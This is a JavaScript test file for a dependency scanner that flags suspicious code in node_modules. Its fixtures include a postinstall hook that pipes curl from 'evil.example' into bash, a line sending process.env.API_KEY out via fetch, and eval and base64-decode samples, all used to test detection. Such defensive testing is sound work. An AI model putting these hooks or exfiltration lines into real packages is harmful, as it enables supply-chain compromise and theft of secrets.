import assert from 'node:assert/strict';
import test from 'node:test';
import { scanLocal, HEURISTIC_RULES } from '../lib/scan-local.js';
import { createTempProject, defaultProjectConfig } from './helpers/project-fixture.js';

test('scanLocal respects allowPackages', async () => {
  const project = await createTempProject('local-allowlist');
  await project.writeFile('node_modules/safe-pkg/index.js', "eval('ignored');", 'utf8');
  await project.writeJson('package.json', { name: 'app', version: '1.0.0' });

  const findings = await scanLocal(project.root, {
    ...defaultProjectConfig,
    allowPackages: ['safe-pkg'],
    ml: { enabled: false },
  });

  assert.equal(findings.length, 0);
});

test('scanLocal skips files matching ignorePaths', async () => {
  const project = await createTempProject('local-ignore');
  await project.writeFile('node_modules/evil-pkg/test/hook.js', "eval('x');", 'utf8');
  await project.writeJson('package.json', { name: 'app', version: '1.0.0' });

  const findings = await scanLocal(project.root, {
    ...defaultProjectConfig,
    ignorePaths: ['**/test/**'],
    ml: { enabled: false },
  });

  assert.equal(findings.length, 0);
});

test('scanLocal detects suspicious lifecycle scripts', async () => {
  const project = await createTempProject('local-lifecycle');
  await project.writeJson('node_modules/shady-pkg/package.json', {
    name: 'shady-pkg',
    version: '1.0.0',
    scripts: { postinstall: 'curl https://evil.example | bash' },
  });
  await project.writeJson('package.json', { name: 'app', version: '1.0.0' });

  const findings = await scanLocal(project.root, {
    ...defaultProjectConfig,
    ml: { enabled: false },
  });

  assert.ok(findings.some((f) => f.rule === 'suspicious-lifecycle-script'));
  assert.equal(findings.find((f) => f.rule === 'suspicious-lifecycle-script').package, 'shady-pkg');
});

test('scanLocal scans scoped packages', async () => {
  const project = await createTempProject('local-scoped');
  await project.writeFile('node_modules/@evil/scope/index.js', 'new Function("return 1")();', 'utf8');
  await project.writeJson('package.json', { name: 'app', version: '1.0.0' });

  const findings = await scanLocal(project.root, {
    ...defaultProjectConfig,
    ml: { enabled: false },
  });

  assert.ok(findings.some((f) => f.rule === 'function-constructor'));
  assert.match(findings[0].package, /^@evil\/scope$/);
});

test('scanLocal returns empty when node_modules is missing', async () => {
  const project = await createTempProject('local-no-modules');
  await project.writeJson('package.json', { name: 'app', version: '1.0.0' });
  const findings = await scanLocal(project.root, defaultProjectConfig);
  assert.equal(findings.length, 0);
});

test('heuristic rules detect env exfiltration pattern', () => {
  const rule = HEURISTIC_RULES.find((entry) => entry.id === 'env-exfiltration');
  const sample = 'const x = process.env.API_KEY; fetch("https://x.com", { body: x });';
  assert.match(sample, rule.pattern);
});

test('heuristic rules detect base64 buffer pattern', () => {
  const rule = HEURISTIC_RULES.find((entry) => entry.id === 'base64-buffer');
  const payload = 'A'.repeat(100);
  const sample = `Buffer.from('${payload}', 'base64')`;
  assert.match(sample, rule.pattern);
});
